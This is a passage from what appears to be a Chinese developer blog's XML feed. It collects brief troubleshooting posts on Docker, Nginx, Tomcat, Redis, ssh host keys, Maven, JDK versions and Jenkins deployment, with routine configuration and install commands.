的網路之間是通的，可以使用ping指令來測試看看。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Set Docker Do Not Auto Restart</title>
    <url>/posts/ad896bfa/</url>
    <content><![CDATA[<h3 id="Intro-How-To-Set-Docker-Do-Not-Auto-Restart"><a href="#Intro-How-To-Set-Docker-Do-Not-Auto-Restart" class="headerlink" title="Intro How To Set Docker Do Not Auto Restart"></a>Intro How To Set Docker Do Not Auto Restart</h3><span id="more"></span>
<p>這篇介紹How To Set Docker Do Not Auto Restart。</p>
<h3 id="在docker-compose-yml-設定"><a href="#在docker-compose-yml-設定" class="headerlink" title="在docker-compose.yml 設定"></a>在docker-compose.yml 設定</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">services:</span><br><span class="line">  &#123;instance&#125;:</span><br><span class="line">    extends:</span><br><span class="line">      file: services/xxx.yml</span><br><span class="line">      service: xxx</span><br><span class="line">    restart: <span class="string">&quot;no&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>DockerCompose</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Install Nginx On Rocky8</title>
    <url>/posts/63a80de6/</url>
    <content><![CDATA[<h3 id="How-To-Install-Nginx-On-Rocky8"><a href="#How-To-Install-Nginx-On-Rocky8" class="headerlink" title="How To Install Nginx On Rocky8"></a>How To Install Nginx On Rocky8</h3><span id="more"></span>
<p>這篇介紹How To Install Nginx On Rocky8。</p>
<h3 id="安裝指令"><a href="#安裝指令" class="headerlink" title="安裝指令"></a>安裝指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo dnf install nginx</span><br><span class="line">$ sudo systemctl <span class="built_in">enable</span> nginx</span><br><span class="line">$ sudo systemctl start nginx</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Rocky8</tag>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Print Tomcat GC log</title>
    <url>/posts/d2b9fb66/</url>
    <content><![CDATA[<h3 id="How-To-Print-Tomcat-GC-log"><a href="#How-To-Print-Tomcat-GC-log" class="headerlink" title="How To Print Tomcat GC log"></a>How To Print Tomcat GC log</h3><span id="more"></span>
<p>這篇介紹How To Print Tomcat GC log。</p>
<h3 id="Path-amp-Instruction"><a href="#Path-amp-Instruction" class="headerlink" title="Path &amp; Instruction"></a>Path &amp; Instruction</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Path:</span><br><span class="line">/tomcat/bin/setenv.sh</span><br><span class="line"></span><br><span class="line">Instruction:</span><br><span class="line">CATALINA_OPTS=<span class="string">&quot; -Xloggc:<span class="variable">$&#123;CATALINA_BASE&#125;</span>/logs/gc.log -XX:+PrintGCDetails -XX:+PrintGCApplicationStoppedTime &quot;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Set Tomcat JVM Heap Memory</title>
    <url>/posts/46dbd0f1/</url>
    <content><![CDATA[<h3 id="How-To-Set-Tomcat-JVM-Heap-Memory"><a href="#How-To-Set-Tomcat-JVM-Heap-Memory" class="headerlink" title="How To Set Tomcat JVM Heap Memory"></a>How To Set Tomcat JVM Heap Memory</h3><span id="more"></span>
<p>這篇介紹How To Set Tomcat JVM Heap Memory。</p>
<h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /usr/local/tomcat/bin/setenv.sh</span><br><span class="line">$ vi setenv.sh</span><br><span class="line"></span><br><span class="line">找到HEAP_ARGS=<span class="string">&quot;-Xms1g -Xmx1g&quot;</span></span><br><span class="line"></span><br><span class="line">memo:設定最小以及最大 1g</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Tomcat</category>
      </categories>
      <tags>
        <tag>Tomcat</tag>
        <tag>JVM</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Bash Ip Command Not Found</title>
    <url>/posts/f9e9cf29/</url>
    <content><![CDATA[<h3 id="How-To-Solve-Bash-Ip-Command-Not-Found"><a href="#How-To-Solve-Bash-Ip-Command-Not-Found" class="headerlink" title="How To Solve Bash Ip Command Not Found"></a>How To Solve Bash Ip Command Not Found</h3><span id="more"></span>
<p>這篇介紹How To Solve Bash Ip Command Not Found。</p>
<h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@a3cdec4e6a4b:/data<span class="comment"># ip addr show</span></span><br><span class="line">bash: ip: <span class="built_in">command</span> not found</span><br><span class="line"></span><br><span class="line">$ apt-get update &amp; apt-get install -y iproute2</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ip</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Can Not Add Master For Slot Ranges</title>
    <url>/posts/691f3ce4/</url>
    <content><![CDATA[<h3 id="Intro-How-To-Solve-Can-Not-Add-Master-For-Slot-Ranges"><a href="#Intro-How-To-Solve-Can-Not-Add-Master-For-Slot-Ranges" class="headerlink" title="Intro How To Solve Can Not Add Master For Slot Ranges"></a>Intro How To Solve Can Not Add Master For Slot Ranges</h3><span id="more"></span>
<p>這篇介紹How To Solve Can Not Add Master For Slot Ranges.</p>
<h3 id="Upgrade-Redisson-3-16-6-to-3-16-8-issue"><a href="#Upgrade-Redisson-3-16-6-to-3-16-8-issue" class="headerlink" title="Upgrade Redisson 3.16.6 to 3.16.8 issue"></a>Upgrade Redisson 3.16.6 to 3.16.8 issue</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">init時出現</span><br><span class="line">[2022/03/12 20:46:02.463][ClusterConnectionManager.java:301][ERROR][redisson-netty-2-5] </span><br><span class="line">Can<span class="string">&#x27;t add master: redis://&#123;ip&#125;:&#123;port&#125; for slot ranges: [[10923-16383]]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">原因是有override 本身的ClientConnectionsEntry方法</span></span><br><span class="line"><span class="string">在3.16.6可以work，但上去3.16.8就發生找不到問題。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">解決方法:重新override新方法 </span></span><br><span class="line"><span class="string">或</span></span><br><span class="line"><span class="string">將原override方法移除，即可使用3.16.8 work。</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redisson</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Bash Ping Command Not Found</title>
    <url>/posts/316e59b6/</url>
    <content><![CDATA[<h3 id="How-To-Solve-Bash-Ping-Command-Not-Found"><a href="#How-To-Solve-Bash-Ping-Command-Not-Found" class="headerlink" title="How To Solve Bash Ping Command Not Found"></a>How To Solve Bash Ping Command Not Found</h3><span id="more"></span>
<p>這篇介紹How To Solve Bash Ping Command Not Found。</p>
<h3 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root@a3cdec4e6a4b:/<span class="comment"># ping 172.17.0.1</span></span><br><span class="line">bash: ping: <span class="built_in">command</span> not found</span><br><span class="line"></span><br><span class="line">$ apt-get update -y</span><br><span class="line">$ apt-get install -y iputils-ping</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ping</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Can not Connect To The Docker Daemon</title>
    <url>/posts/69a497a7/</url>
    <content><![CDATA[<h3 id="How-To-Solve-Can-not-Connect-To-The-Docker-Daemon"><a href="#How-To-Solve-Can-not-Connect-To-The-Docker-Daemon" class="headerlink" title="How To Solve Can not Connect To The Docker Daemon"></a>How To Solve Can not Connect To The Docker Daemon</h3><span id="more"></span>
<p>這篇介紹How To Solve Can not Connect To The Docker Daemon。</p>
<h3 id="錯誤訊息-amp-原因"><a href="#錯誤訊息-amp-原因" class="headerlink" title="錯誤訊息 &amp; 原因"></a>錯誤訊息 &amp; 原因</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</span><br><span class="line"></span><br><span class="line">執行docker指令時出現以上錯誤訊息，原因是尚未<span class="built_in">enable</span> docker造成。</span><br><span class="line">請使用以下三句指令做檢查和設定來排除問題。</span><br><span class="line">$ systemctl stats docker -&gt; 檢查</span><br><span class="line">$ systemctl status docker</span><br><span class="line">$ systemctl <span class="built_in">enable</span> docker -&gt; 設定</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Docker Compose Line 1 Not Command Not Found</title>
    <url>/posts/a339f5ea/</url>
    <content><![CDATA[<h3 id="Intro-How-To-Solve-Docker-Compose-Line-1-Not-Command-Not-Found"><a href="#Intro-How-To-Solve-Docker-Compose-Line-1-Not-Command-Not-Found" class="headerlink" title="Intro How To Solve Docker Compose Line 1 Not Command Not Found"></a>Intro How To Solve Docker Compose Line 1 Not Command Not Found</h3><span id="more"></span>
<p>這篇介紹How To Solve Docker Compose Line 1 Not Command Not Found。</p>
<h3 id="How-To-Solve"><a href="#How-To-Solve" class="headerlink" title="How To Solve"></a>How To Solve</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">檢查docker-compose檔案大小是否異常</span><br><span class="line">代表安裝不完全，需檢查安裝指令後重新安裝!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>DockerCompose</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>DockerCompose</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Command Not Allowed When Used Memory Is Greater Than MaxMemory</title>
    <url>/posts/9b01a8ea/</url>
    <content><![CDATA[<h2 id="How-To-Solve-Command-Not-Allowed-When-Used-Memory-Is-Greater-Than-MaxMemory"><a href="#How-To-Solve-Command-Not-Allowed-When-Used-Memory-Is-Greater-Than-MaxMemory" class="headerlink" title="How To Solve Command Not Allowed When Used Memory Is Greater Than MaxMemory"></a>How To Solve Command Not Allowed When Used Memory Is Greater Than MaxMemory</h2><span id="more"></span>
<p>這篇介紹How To Solve Command Not Allowed When Used Memory Is Greater Than MaxMemory。</p>
<h2 id="Linux-Modify-setting"><a href="#Linux-Modify-setting" class="headerlink" title="Linux Modify setting:"></a>Linux Modify setting:</h2><p>$ cd &#x2F;usr&#x2F;local&#x2F;redis&#x2F;redis_6.2.6&#x2F;common.conf</p>
<p>上述指令請依照安裝路徑尋找該Redis common.conf</p>
<p>修改maxmemory參數</p>
<p>即可測試</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Gzip Stdin Not In Gzip Format</title>
    <url>/posts/cf3b4e00/</url>
    <content><![CDATA[<h3 id="How-To-Solve-Gzip-Stdin-Not-In-Gzip-Format"><a href="#How-To-Solve-Gzip-Stdin-Not-In-Gzip-Format" class="headerlink" title="How To Solve Gzip Stdin Not In Gzip Format"></a>How To Solve Gzip Stdin Not In Gzip Format</h3><span id="more"></span>
<p>這篇介紹How To Solve Gzip Stdin Not In Gzip Format。</p>
<h3 id="發生過程"><a href="#發生過程" class="headerlink" title="發生過程"></a>發生過程</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">有兩種可能</span><br><span class="line">1.被壓縮檔沒有用gzip進行壓縮，而是被重新命名為xxx.tar.gz</span><br><span class="line">2.壓縮檔不完整導致解壓縮失敗</span><br><span class="line"></span><br><span class="line">如果是第一種，只需要在解壓縮時從</span><br><span class="line">$ tar zxvf tar.gz 改成</span><br><span class="line">$ tar -xvf tar.gz</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Gzip</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Gzip</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Error Response From Daemon Conflict Unable To Delete Cause Image Used By Container</title>
    <url>/posts/c3ac6e4f/</url>
    <content><![CDATA[<h3 id="How-To-Solve-Error-Response-From-Daemon-Conflict-Unable-To-Delete-Cause-Image-Used-By-Container"><a href="#How-To-Solve-Error-Response-From-Daemon-Conflict-Unable-To-Delete-Cause-Image-Used-By-Container" class="headerlink" title="How To Solve Error Response From Daemon Conflict Unable To Delete Cause Image Used By Container"></a>How To Solve Error Response From Daemon Conflict Unable To Delete Cause Image Used By Container</h3><span id="more"></span>
<p>這篇介紹How To Solve Error Response From Daemon Conflict Unable To Delete Cause Image Used By Container。</p>
<h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">cause use docker rmi &lt;image_id&gt; <span class="keyword">then</span> display Error Message</span><br><span class="line"></span><br><span class="line">$ Error response from daemon: conflict: unable to delete 3796662bb43e </span><br><span class="line">(must be forced) - image is being used by stopped container 4badd2227afa</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">solution : </span><br><span class="line">docker stop 4badd2227afa</span><br><span class="line">docker rmi -f &lt;image_id&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Docker</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Image</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Host Key Verification Failed</title>
    <url>/posts/430ad1ac/</url>
    <content><![CDATA[<h3 id="How-To-Solve-Host-Key-Verification-Failed"><a href="#How-To-Solve-Host-Key-Verification-Failed" class="headerlink" title="How To Solve Host Key Verification Failed"></a>How To Solve Host Key Verification Failed</h3><span id="more"></span>
<p>這篇介紹How To Solve Host Key Verification Failed。</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在Linux執行 ssh -p xxxxx root@yyyyy</span><br><span class="line"></span><br><span class="line">出現以下訊息:</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @</span><br><span class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><br><span class="line">IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!</span><br><span class="line">Someone could be eavesdropping on you right now (man-in-the-middle attack)!</span><br><span class="line">It is also possible that a host key has just been changed.</span><br><span class="line">The fingerprint <span class="keyword">for</span> the ECDSA key sent by the remote host is</span><br><span class="line">SHA256:/hYKEFk1s+6eLV4wPpfFcISsvZJY/g/LT6kxB/XaPEE.</span><br><span class="line">Please contact your system administrator.</span><br><span class="line">Add correct host key <span class="keyword">in</span> /home/&#123;username&#125;/.ssh/known_hosts to get rid of this message.</span><br><span class="line">Offending ECDSA key <span class="keyword">in</span> /home/&#123;username&#125;/.ssh/known_hosts:19</span><br><span class="line">ECDSA host key <span class="keyword">for</span> [yyyyy]:xxxxx has changed and you have requested strict checking.</span><br><span class="line">Host key verification failed.</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/&#123;username&#125;/.ssh/known_hosts</span><br><span class="line">將登入的ssh -p xxxxx root@yyyyy 該行移除</span><br><span class="line">即可正常ssh登入</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ssh</category>
      </categories>
      <tags>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Java Lang Unsupported Class Version Error</title>
    <url>/posts/eccfbf1e/</url>
    <content><![CDATA[<h3 id="How-To-Solve-Java-Lang-Unsupported-Class-Version-Error"><a href="#How-To-Solve-Java-Lang-Unsupported-Class-Version-Error" class="headerlink" title="How To Solve Java Lang Unsupported Class Version Error"></a>How To Solve Java Lang Unsupported Class Version Error</h3><span id="more"></span>
<p>這篇介紹How To Solve Java Lang Unsupported Class Version Error。</p>
<h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用Jdk17包版，但程式pom.xml改用&lt;jdk.version&gt;21&lt;/jdk.version&gt;時會</span><br><span class="line">出現以下錯誤訊息:</span><br><span class="line"></span><br><span class="line">java.lang.UnsupportedClassVersionError: xxx</span><br><span class="line">has been compiled by a more recent version of the Java Runtime (class file version 65.0), </span><br><span class="line">this version of the Java Runtime only recognizes class file versions up to 61.0 </span><br><span class="line">(unable to load class [xxx])</span><br><span class="line"></span><br><span class="line">原因是編譯環境與執行環境不一致造成</span><br><span class="line">兩邊需改用相同Jdk版本</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>JDK</category>
      </categories>
      <tags>
        <tag>JDK17</tag>
        <tag>JDK21</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Maven Omitted For Conflict With</title>
    <url>/posts/35d43ede/</url>
    <content><![CDATA[<h3 id="Intro-How-To-Solve-Maven-Omitted-For-Conflict-With"><a href="#Intro-How-To-Solve-Maven-Omitted-For-Conflict-With" class="headerlink" title="Intro How To Solve Maven Omitted For Conflict With"></a>Intro How To Solve Maven Omitted For Conflict With</h3><span id="more"></span>
<p>這篇介紹How To Solve Maven Omitted For Conflict With.</p>
<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Maven Dependency 的先後順序決定引用jar檔的優先順序。</span><br><span class="line">當有Dependency版本衝突時，需要做Dependency Exclusions來排除不適用的jar版本。</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;org.redisson&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;redisson&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;3.16.8&lt;/version&gt;</span><br><span class="line">	&lt;exclusions&gt;</span><br><span class="line">		&lt;exclusion&gt;</span><br><span class="line">			&lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">			&lt;artifactId&gt;jackson-core&lt;/artifactId&gt;</span><br><span class="line">		&lt;/exclusion&gt;</span><br><span class="line">	&lt;/exclusions&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">照上例即會排除com.fasterxml.jackson.core有問題的版本，解決版本衝突。</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Maven</category>
      </categories>
      <tags>
        <tag>Maven</tag>
        <tag>DependencyExclusions</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Java Lang No Class Def Found Error Org Mockito Mockito</title>
    <url>/posts/7febd23d/</url>
    <content><![CDATA[<h3 id="How-To-Solve-Java-Lang-No-Class-Def-Found-Error-Org-Mockito-Mockito"><a href="#How-To-Solve-Java-Lang-No-Class-Def-Found-Error-Org-Mockito-Mockito" class="headerlink" title="How To Solve Java Lang No Class Def Found Error Org Mockito Mockito"></a>How To Solve Java Lang No Class Def Found Error Org Mockito Mockito</h3><span id="more"></span>
<p>這篇介紹How To Solve Java Lang No Class Def Found Error Org Mockito Mockito。</p>
<h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">The scope <span class="built_in">test</span> indicates that the dependencies (binary files) </span><br><span class="line">are only used using maven<span class="string">&#x27;s test phase.</span></span><br><span class="line"><span class="string">They are not delivered with the final target jar though. </span></span><br><span class="line"><span class="string">So if you run tests yourself (rather than letting maven do it),</span></span><br><span class="line"><span class="string">you&#x27;</span>d better leave the default runtime scope, as follows:</span><br><span class="line"></span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.mockito&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mockito-all&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.0.2-beta&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">結論是將&lt;scope&gt;<span class="built_in">test</span>&lt;/scope&gt;拿掉即可解決!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Mockito</category>
      </categories>
      <tags>
        <tag>Mockito</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Jenkins Docker Can Not SSH To Other Server</title>
    <url>/posts/20605838/</url>
    <content><![CDATA[<h3 id="How-To-Solve-Jenkins-Docker-Can-Not-SSH-To-Other-Server"><a href="#How-To-Solve-Jenkins-Docker-Can-Not-SSH-To-Other-Server" class="headerlink" title="How To Solve Jenkins Docker Can Not SSH To Other Server"></a>How To Solve Jenkins Docker Can Not SSH To Other Server</h3><span id="more"></span>
<p>這篇介紹How To Solve Jenkins Docker Can Not SSH To Other Server。</p>
<h3 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">對於新建一台Server後，要使用Jenkins去對這台Server自動佈署~</span><br><span class="line">如果Jenkins是Docker的話，必須先確保在Jenkins Docker上可以不用</span><br><span class="line">使用密碼ssh至要佈署的Server。</span><br><span class="line"></span><br><span class="line">這時需先登入Jenkins Container，使用</span><br><span class="line">$ ssh-keygen</span><br><span class="line">Enter</span><br><span class="line">Enter</span><br><span class="line">Enter</span><br><span class="line">$ ssh-copy-id root@xxx.xxx.xxx.xxx</span><br><span class="line">$ root@xxx.xxx.xxx.xxx<span class="string">&#x27;s password: (第一次需輸入password)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">即可設定完成!</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Jenkins</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Navicat Missing Required Library Sql lite Dll 998</title>
    <url>/posts/bad1a2b1/</url>
    <content><![CDATA[<h3 id="How-To-Solve-Navicat-Missing-Required-Library-Sql-lite-Dll-998"><a href="#How-To-Solve-Navicat-Missing-Required-Library-Sql-lite-Dll-998" class="headerlink" title="How To Solve Navicat Missing Required Library Sql lite Dll 998"></a>How To Solve Navicat Missing Required Library Sql lite Dll 998</h3><span id="more"></span>
<p>這篇介紹How To Solve Navicat Missing Required Library Sql lite Dll 998。</p>
<h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Navicat是一款Database軟體，功能類似SQL Developer，可以連很多種資料庫。</span><br><span class="line">ex: Oracle、MySQL...等</span><br><span class="line"></span><br><span class="line">這次遇到是開啟Navicat Lite出現以下錯誤:</span><br><span class="line">navcat missing required library sqlite.dll 998</span><br><span class="line"></span><br><span class="line">原因:</span><br><span class="line">可能有其他軟體造成衝突</span><br><span class="line"></span><br><span class="line">解決方法:</span><br><span class="line">將電腦重新啟動後，再次執行即解決!</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Navicat</category>
      </categories>
      <tags>
        <tag>Navicat</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve No Class Def Found Error Could Not Initialize Class Org Apache IgniteJdbcThinDriver</title>
    <url>/posts/393cb034/</url>
    <content><![CDATA[<h3 id="How-To-Solve-No-Class-Def-Found-Error-Could-Not-Initialize-Class-Org-Apache-IgniteJdbcThinDriver"><a href="#How-To-Solve-No-Class-Def-Found-Error-Could-Not-Initialize-Class-Org-Apache-IgniteJdbcThinDriver" class="headerlink" title="How To Solve No Class Def Found Error Could Not Initialize Class Org Apache IgniteJdbcThinDriver"></a>How To Solve No Class Def Found Error Could Not Initialize Class Org Apache IgniteJdbcThinDriver</h3><span id="more"></span>
<p>這篇介紹How To Solve No Class Def Found Error Could Not Initialize Class Org Apache IgniteJdbcThinDriver。</p>
<h3 id="process"><a href="#process" class="headerlink" title="process"></a>process</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在升級Jdk8 -&gt; Jdk17時，Maven build時會出現</span><br><span class="line">java.lang.NoClassDefFoundError: Could not initialize class org.apache.ignite.IgniteJdbcThinDriver 錯誤訊息</span><br><span class="line"></span><br><span class="line">原因是Apache Ignite 2.7.0建議使用 Java 8，不完全支持 Java 12以上。需調整設定才能正常運作</span><br><span class="line"></span><br><span class="line">解決方法:增加&lt;argLine&gt;--add-opens java.base/java.nio=ALL-UNNAMED&lt;/argLine&gt;</span><br><span class="line"></span><br><span class="line">plugin如下:</span><br><span class="line"></span><br><span class="line">&lt;!-- maven unit <span class="built_in">test</span> plug-in --&gt;</span><br><span class="line">&lt;plugin&gt;</span><br><span class="line">	&lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;3.0.0&lt;/version&gt;</span><br><span class="line">	&lt;configuration&gt;</span><br><span class="line">		&lt;!-- 限制測試爲單一執行序，一個一個單元進行測試 --&gt;</span><br><span class="line">		&lt;forkCount&gt;1&lt;/forkCount&gt;</span><br><span class="line">		&lt;reuseForks&gt;<span class="literal">false</span>&lt;/reuseForks&gt;</span><br><span class="line">		&lt;!-- 共要設定2項 --&gt;</span><br><span class="line">		&lt;argLine&gt;-Xmx2G&lt;/argLine&gt;</span><br><span class="line">		&lt;argLine&gt;--add-opens java.base/java.lang=ALL-UNNAMED&lt;/argLine&gt;</span><br><span class="line">		&lt;argLine&gt;--add-opens java.base/java.nio=ALL-UNNAMED&lt;/argLine&gt;</span><br><span class="line">	&lt;/configuration&gt;</span><br><span class="line">&lt;/plugin&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Java17</category>
      </categories>
      <tags>
        <tag>JDK</tag>
        <tag>Java17</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Nginx Error Invalid PID Number In Nginx PID</title>
    <url>/posts/3a76ddf0/</url>
    <content><![CDATA[<h3 id="How-To-Solve-Nginx-Error-Invalid-PID-Number-In-Nginx-PID"><a href="#How-To-Solve-Nginx-Error-Invalid-PID-Number-In-Nginx-PID" class="headerlink" title="How To Solve Nginx Error Invalid PID Number In Nginx PID?"></a>How To Solve Nginx Error Invalid PID Number In Nginx PID?</h3><span id="more"></span>
<p>這篇介紹How To Solve Nginx Error Invalid PID Number In Nginx PID?</p>
<h3 id="錯誤及解決方法"><a href="#錯誤及解決方法" class="headerlink" title="錯誤及解決方法"></a>錯誤及解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">在執行 nginx -s reload時，出現以下訊息</span><br><span class="line">nginx: [error] invalid PID number <span class="keyword">in</span> <span class="string">&quot;/run/nginx.pid&quot;</span></span><br><span class="line"></span><br><span class="line">解決指令</span><br><span class="line">$ nginx -c /etc/nginx/nginx.conf</span><br><span class="line">$ nginx -s reload</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Nginx</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve OKHttp Connection Was Leaked</title>
    <url>/posts/8b59c8b8/</url>
    <content><![CDATA[<h3 id="How-To-Solve-OKHttp-Connection-Was-Leaked"><a href="#How-To-Solve-OKHttp-Connection-Was-Leaked" class="headerlink" title="How To Solve OKHttp Connection Was Leaked"></a>How To Solve OKHttp Connection Was Leaked</h3><span id="more"></span>
<p>這篇介紹How To Solve OKHttp Connection Was Leaked。</p>
<h3 id="發生情境"><a href="#發生情境" class="headerlink" title="發生情境"></a>發生情境</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用OKHttp時，若call.execute();失敗時</span><br><span class="line">會出現okhttp3.internal.platform.Platform.<span class="built_in">log</span> A connection to https://xxx was leaked. </span><br><span class="line">Did you forget to close a response body? 的警告</span><br></pre></td></tr></table></figure>

<h3 id="解決方法"><a href="#解決方法" class="headerlink" title="解決方法"></a>解決方法</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">使用try-catch-finally處理，在finally裡面不管成功或失敗</span><br><span class="line">都必須將response.close();</span><br><span class="line"><span class="keyword">if</span> (response != null) &#123;</span><br><span class="line">	response.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>OKHttp</category>
      </categories>
      <tags>
        <tag>OKHttp</tag>
      </tags>
  </entry>
  <entry>
    <title>How To Solve Nohup Failed To Run Command Filebeat Permission Denied</title>
    <url>/posts/74da4c15/</url>
    <content><![CDATA[<h3 id="Intro-How-To-Solve-Nohup-Failed-To-Run-Command-Filebeat-Permission-Denied"><a href="#Intro-How-To-Solve-Nohup-Failed-To-Run-Command-Filebeat-Permission-Denied" class="headerlink" title="Intro How To Solve Nohup Failed To Run Command Filebeat Permission Denied"></a>Intro How To Solve Nohup Failed To Run Command Filebeat Permission Denied</h3><span id="more"></span>
<p>這篇介紹How To Solve Nohup Failed To Run Command Filebeat Permission Denied。</p>
